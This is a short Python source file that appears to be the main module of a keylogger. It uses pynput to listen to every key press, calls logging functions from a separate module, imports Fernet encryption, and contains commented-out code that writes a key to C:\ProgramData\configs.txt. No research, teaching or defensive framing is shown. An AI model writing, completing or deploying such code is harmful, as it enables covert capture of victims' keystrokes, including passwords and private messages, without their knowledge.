from pynput.keyboard import Listener
import threading
import webbrowser
from cryptography.fernet import Fernet
from listener import on_press, writeLogs

#def encrypting(keyToDecrypt):
#    f = open("C:\\ProgramData\\configs.txt", "a")
#    f.write(str(keyToDecrypt + "\n"))
#   f.close()

def join():
    with Listener(on_press=on_press) as ls:
        writeLogs(0)
        ls.join()

if __name__ == "__main__":
    try:
        threading.Thread(target=join()).start()
    except Exception as e:
        print(e)